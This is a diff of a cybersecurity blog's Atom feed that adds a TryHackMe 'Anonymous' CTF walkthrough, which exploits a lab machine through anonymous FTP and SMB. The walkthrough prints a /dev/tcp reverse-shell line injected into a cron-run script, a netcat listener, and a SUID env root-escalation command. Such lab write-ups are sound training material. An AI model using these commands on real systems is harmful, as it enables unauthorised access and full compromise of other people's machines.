@@ -1,4 +1,229 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://0.0.0.0:8000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:8000/" rel="alternate" type="text/html" /><updated>2020-05-16T04:15:45+05:30</updated><id>http://0.0.0.0:8000/atom.xml</id><title type="html">n0nu11</title><subtitle>Cybersecurity blog for Writeups, Tutorials, Solutions and Walkthroughs</subtitle><author><name>n0nu11</name></author><entry><title type="html">[TryHackMe] Pickle Rick Walkthrough</title><link href="http://0.0.0.0:8000/tryhackme/2020/05/15/pickle-rick/" rel="alternate" type="text/html" title="[TryHackMe] Pickle Rick Walkthrough" /><published>2020-05-15T20:40:18+05:30</published><updated>2020-05-15T20:40:18+05:30</updated><id>http://0.0.0.0:8000/tryhackme/2020/05/15/pickle-rick</id><content type="html" xml:base="http://0.0.0.0:8000/tryhackme/2020/05/15/pickle-rick/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://0.0.0.0:8000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:8000/" rel="alternate" type="text/html" /><updated>2020-06-06T00:51:42+05:30</updated><id>http://0.0.0.0:8000/atom.xml</id><title type="html">n0nu11</title><subtitle>Cybersecurity blog for Writeups, Tutorials, Solutions and Walkthroughs</subtitle><author><name>n0nu11</name></author><entry><title type="html">[TryHackMe] Anonymous Walkthrough</title><link href="http://0.0.0.0:8000/tryhackme/2020/06/05/anonymous/" rel="alternate" type="text/html" title="[TryHackMe] Anonymous Walkthrough" /><published>2020-06-05T20:40:18+05:30</published><updated>2020-06-05T20:40:18+05:30</updated><id>http://0.0.0.0:8000/tryhackme/2020/06/05/anonymous</id><content type="html" xml:base="http://0.0.0.0:8000/tryhackme/2020/06/05/anonymous/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous0.png&quot; alt=&quot;anonymous image&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Enumeration is defined as the process of extracting user names, machine names, network resources, shares, and services from a system. … The gathered information is used to identify the vulnerabilities or weak points in system security and tries to exploit the System gaining phase.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Let’s start the enumeration process. Heuristic tinkering/passive scanning shows that there was no webserver running but FTP and SSH is running.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Nmap is a free and open-source network scanner created by Gordon Lyon. Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Aggressive Nmap scan shows us the ports &lt;code class=&quot;highlighter-rouge&quot;&gt;21,22,139,445&lt;/code&gt; are open.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- -A -T4 10.10.3.190 -oN nmap/full&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous1.1.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;FTP&lt;/strong&gt;, &lt;strong&gt;SMB&lt;/strong&gt; and &lt;strong&gt;SSH&lt;/strong&gt; ports are open. let’s try enumerating the SMB shares first.&lt;/p&gt;
+
+&lt;h2 id=&quot;smb&quot;&gt;SMB&lt;/h2&gt;
+
+&lt;p&gt;let’s check the shares available.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous5.png&quot; alt=&quot;enumeration&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like &lt;code class=&quot;highlighter-rouge&quot;&gt;pics&lt;/code&gt; share is available, with the comment &lt;code class=&quot;highlighter-rouge&quot;&gt;My SMB Share Directory for Pics&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Pics&lt;/strong&gt;? maybe something hidden inside using steganography?.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous6.png&quot; alt=&quot;smb file listing&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see 2 image files &lt;code class=&quot;highlighter-rouge&quot;&gt;corgo2.jpg&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;puppos.jpeg&lt;/code&gt;. let’s download it to our machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous7.png&quot; alt=&quot;downloading files&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk&lt;/code&gt; on both files, turned out only &lt;code class=&quot;highlighter-rouge&quot;&gt;puppos.jpeg&lt;/code&gt; file had something embedded inside. a TIFF file&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous8.png&quot; alt=&quot;binwalk&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;let’s try to extract the embedded contents.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous9.png&quot; alt=&quot;binwalk extraction&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;C&lt;/code&gt; file is the one embedded inside &lt;code class=&quot;highlighter-rouge&quot;&gt;puppos.jpeg&lt;/code&gt;. I checked the file for some information but I got nothing in the end.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous10.png&quot; alt=&quot;rabbit hole&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It was a rabbit hole.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/zLCiUWVfex7ji/giphy.gif&quot; alt=&quot;no results found&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s move on to FTP and check if we get something interesting.&lt;/p&gt;
+
+&lt;h2 id=&quot;ftp&quot;&gt;FTP&lt;/h2&gt;
+
+&lt;p&gt;Let’s check for anonymous login via FTP.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous2.png&quot; alt=&quot;ftp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It worked. let’s check the contents.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous3.png&quot; alt=&quot;ftp files list&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;there are 3 interesting files &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.sh&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;removed_files.log&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;to_do.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;let’s download the files to our kali machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous4.png&quot; alt=&quot;get files from ftp&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;file-cleansh&quot;&gt;FILE: clean.sh&lt;/h4&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;tmp_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;then
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Running cleanup script:  nothing to delete&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/ftp/scripts/removed_files.log
+&lt;span class=&quot;k&quot;&gt;else
+    for &lt;/span&gt;LINE &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/&lt;span class=&quot;nv&quot;&gt;$LINE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; | Removed file /tmp/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LINE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/ftp/scripts/removed_files.log&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
+fi&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;file-removed_fileslog&quot;&gt;FILE: removed_files.log&lt;/h4&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;file-to_dotxt&quot;&gt;FILE: to_do.txt&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I really need to disable the anonymous login...it's really not safe
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Indeed it is. Too late bruh! I already got the file 😆.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/dZjlm0hDSBQYbDZQc9/giphy.gif&quot; alt=&quot;too late&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like the &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.sh&lt;/code&gt; file is running somewhere in the machine repeatedly that is generating that log file and it seems like we have write permission in FTP. What if we inject our code in the &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.sh&lt;/code&gt; file and get a reverse shell?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/vJc55OQZMOojS/giphy.gif&quot; alt=&quot;anonymous&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;gaining-access-reverse-shell&quot;&gt;Gaining Access: Reverse Shell&lt;/h1&gt;
+
+&lt;p&gt;First, we will mount the FTP as a file share and edit files using &lt;code class=&quot;highlighter-rouge&quot;&gt;curlFTPfs&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous11.png&quot; alt=&quot;curlFTPfs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;add &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.sh&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1
+&lt;span class=&quot;nv&quot;&gt;tmp_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;then
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Running cleanup script:  nothing to delete&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/ftp/scripts/removed_files.log
+&lt;span class=&quot;k&quot;&gt;else
+    for &lt;/span&gt;LINE &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp_files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/&lt;span class=&quot;nv&quot;&gt;$LINE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; | Removed file /tmp/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LINE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/ftp/scripts/removed_files.log&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
+fi&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Replace the &amp;lt;ip&amp;gt; and &amp;lt;port&amp;gt; with your ip and port number.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;now let’s open a Netcat listener using &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvnp &amp;lt;port&amp;gt;&lt;/code&gt;. wait for the &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.sh&lt;/code&gt; to run so that we can get a reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/xUPJPop2o56Sv8p8TS/giphy.gif&quot; alt=&quot;5 hours later&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous13.png&quot; alt=&quot;netcat listener&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we got it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/iOm1xOSfAtPzmPXJqH/giphy.gif&quot; alt=&quot;we got him gif&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The file &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; contains the user flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous14.png&quot; alt=&quot;user flag&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; asked for a password. Since we don’t know the password we can skip it.&lt;/p&gt;
+
+&lt;p&gt;This time I used &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&quot;&gt;linpeas&lt;/a&gt; script to enumerate the Linux machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/peass.png&quot; alt=&quot;linpeas&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When checking for SUID binaries. we can see &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/env&lt;/code&gt; has setuid bit set with &lt;strong&gt;root&lt;/strong&gt; privileges. This means we can get a root shell by using &lt;code class=&quot;highlighter-rouge&quot;&gt;env&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous15.png&quot; alt=&quot;setuid binary&quot; /&gt;
+&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous16.png&quot; alt=&quot;setuid flag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s head to &lt;a href=&quot;https://gtfobins.github.io/gtfobins/env/&quot;&gt;gtfobins&lt;/a&gt; for the escalation command.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous17.png&quot; alt=&quot;gtfobin command&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;lets try executing &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/env /bin/sh -p&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous18.png&quot; alt=&quot;priv esc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we got a &lt;strong&gt;root&lt;/strong&gt; shell.&lt;/p&gt;
+
+&lt;p&gt;With the root shell, we can read the contents of the root directory &lt;em&gt;(Actually we can read anything)&lt;/em&gt; which contains the root flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/05062020-anonymous/anonymous19.png&quot; alt=&quot;root flag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/3og0ILLVvPp8d64Jd6/giphy.gif&quot; alt=&quot;game over&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;summary&quot;&gt;Summary&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Nmap scan shows SSH, FTP and SMB ports are open&lt;/li&gt;
+  &lt;li&gt;pics share was available in SMB which contains 2 image files.&lt;/li&gt;
+  &lt;li&gt;The image files are nothing but the rabbit holes.&lt;/li&gt;
+  &lt;li&gt;FTP had 3 files clean.sh, removed_files.log and to_do.txt&lt;/li&gt;
+  &lt;li&gt;We identified that clean.sh was running somewhere, it may be using cron jobs.&lt;/li&gt;
+  &lt;li&gt;To gain access, we first mount the FTP as a filesystem and injected reverse shell command.&lt;/li&gt;
+  &lt;li&gt;With Netcat listener listening on the local kali machine, we got a reverse shell.&lt;/li&gt;
+  &lt;li&gt;The user.txt contained a user flag.&lt;/li&gt;
+  &lt;li&gt;For privilege escalation, the host machine is enumerated using linpeas script.&lt;/li&gt;
+  &lt;li&gt;It showed the /usr/bin/env was set with setuid as root.&lt;/li&gt;
+  &lt;li&gt;Using the command from gtfobins, we use env command to escalate root privilege.&lt;/li&gt;
+  &lt;li&gt;The root flag was found in /root directory.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;before-you-leave&quot;&gt;Before you leave&lt;/h1&gt;
+
+&lt;p&gt;If you have any constructive criticism or any questions, please drop an email at &lt;a href=&quot;mailto:root@n0nu11.tech&quot;&gt;root@n0nu11.tech&lt;/a&gt; or ping me in &lt;a href=&quot;https://instagram.com/dvlp.er&quot;&gt;instagram&lt;/a&gt;. I’ll be happy to hear your feedback.&lt;/p&gt;
+
+&lt;p&gt;Follow me on  &lt;a href=&quot;https://github.com/devwaseem&quot;&gt; &lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt; Github&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/iamwaseem99&quot;&gt;&lt;i class=&quot;fa fa-twitter&quot;&gt;&lt;/i&gt; Twitter&lt;/a&gt;, &lt;a href=&quot;https://www.instagram.com/dvlp.er/&quot;&gt;&lt;i class=&quot;fa fa-instagram&quot;&gt;&lt;/i&gt; Instagram&lt;/a&gt;, &lt;a href=&quot;https://www.facebook.com/dvlprwaseem&quot;&gt;&lt;i class=&quot;fa fa-facebook&quot;&gt;&lt;/i&gt; Facebook&lt;/a&gt;, &lt;a href=&quot;https://www.linkedin.com/in/devwaseem/&quot;&gt;&lt;i class=&quot;fa fa-linkedin&quot;&gt;&lt;/i&gt; LinkedIn&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/42D3CxaINsAFemFuId/giphy.gif&quot; alt=&quot;bye&quot; /&gt;&lt;/p&gt;</content><author><name>n0nu11</name></author><category term="[&quot;tryhackme&quot;]" /><category term="tryhackme" /><category term="solutions" /><category term="CTF" /><category term="suid" /><category term="privilege escalation" /><category term="ftp" /><category term="cron jobs" /><category term="smb" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:8000/assets/images/05062020-anonymous/anonymous0.png" /><media:content medium="image" url="http://0.0.0.0:8000/assets/images/05062020-anonymous/anonymous0.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">[TryHackMe] Pickle Rick Walkthrough</title><link href="http://0.0.0.0:8000/tryhackme/2020/05/15/pickle-rick/" rel="alternate" type="text/html" title="[TryHackMe] Pickle Rick Walkthrough" /><published>2020-05-15T20:40:18+05:30</published><updated>2020-05-15T20:40:18+05:30</updated><id>http://0.0.0.0:8000/tryhackme/2020/05/15/pickle-rick</id><content type="html" xml:base="http://0.0.0.0:8000/tryhackme/2020/05/15/pickle-rick/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Pickle Rick is a Rick and Morty themed CTF challenge. It requires you to exploit the webserver and find &lt;strong&gt;3&lt;/strong&gt; ingredients that will help Rick make his potion to transform himself back to human from a pickle.&lt;/p&gt;
 
@@ -212,7 +437,7 @@ Replace your IP address with &amp;lt;YOUR IP&amp;gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;before-you-leave&quot;&gt;Before you leave&lt;/h1&gt;
 
-&lt;p&gt;If you have any constructive criticism or any questions, please drop an email at root@n0nu11.tech or ping me in &lt;a href=&quot;https://instagram.com/dvlp.er&quot;&gt;instagram&lt;/a&gt;. I’ll be happy to hear your feedback.&lt;/p&gt;
+&lt;p&gt;If you have any constructive criticism or any questions, please drop an email at &lt;a href=&quot;mailto:root@n0nu11.tech&quot;&gt;root@n0nu11.tech&lt;/a&gt; or ping me in &lt;a href=&quot;https://instagram.com/dvlp.er&quot;&gt;instagram&lt;/a&gt;. I’ll be happy to hear your feedback.&lt;/p&gt;
 
 &lt;p&gt;Follow me on  &lt;a href=&quot;https://github.com/devwaseem&quot;&gt; &lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt; Github&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/iamwaseem99&quot;&gt;&lt;i class=&quot;fa fa-twitter&quot;&gt;&lt;/i&gt; Twitter&lt;/a&gt;, &lt;a href=&quot;https://www.instagram.com/dvlp.er/&quot;&gt;&lt;i class=&quot;fa fa-instagram&quot;&gt;&lt;/i&gt; Instagram&lt;/a&gt;, &lt;a href=&quot;https://www.facebook.com/dvlprwaseem&quot;&gt;&lt;i class=&quot;fa fa-facebook&quot;&gt;&lt;/i&gt; Facebook&lt;/a&gt;, &lt;a href=&quot;https://www.linkedin.com/in/devwaseem/&quot;&gt;&lt;i class=&quot;fa fa-linkedin&quot;&gt;&lt;/i&gt; LinkedIn&lt;/a&gt;.&lt;/p&gt;
 
@@ -580,7 +805,7 @@ I have also made a simple script called AnonymousBash. Which as the name suggest
 
 &lt;h2 id=&quot;before-you-leave&quot;&gt;Before you leave&lt;/h2&gt;
 
-&lt;p&gt;If you have any constructive criticism or any questions, please drop an email at root@n0nu11.tech or ping me in &lt;a href=&quot;https://instagram.com/dvlp.er&quot;&gt;instagram&lt;/a&gt;. I’ll be happy to hear your feedback.&lt;/p&gt;
+&lt;p&gt;If you have any constructive criticism or any questions, please drop an email at &lt;a href=&quot;mailto:root@n0nu11.tech&quot;&gt;root@n0nu11.tech&lt;/a&gt; or ping me in &lt;a href=&quot;https://instagram.com/dvlp.er&quot;&gt;instagram&lt;/a&gt;. I’ll be happy to hear your feedback.&lt;/p&gt;
 
 &lt;p&gt;Follow me on  &lt;a href=&quot;https://github.com/devwaseem&quot;&gt; &lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt; Github&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/iamwaseem99&quot;&gt;&lt;i class=&quot;fa fa-twitter&quot;&gt;&lt;/i&gt; Twitter&lt;/a&gt;, &lt;a href=&quot;https://www.instagram.com/dvlp.er/&quot;&gt;&lt;i class=&quot;fa fa-instagram&quot;&gt;&lt;/i&gt; Instagram&lt;/a&gt;, &lt;a href=&quot;https://www.facebook.com/dvlprwaseem&quot;&gt;&lt;i class=&quot;fa fa-facebook&quot;&gt;&lt;/i&gt; Facebook&lt;/a&gt;, &lt;a href=&quot;https://www.linkedin.com/in/devwaseem/&quot;&gt;&lt;i class=&quot;fa fa-linkedin&quot;&gt;&lt;/i&gt; LinkedIn&lt;/a&gt;.&lt;/p&gt;
 
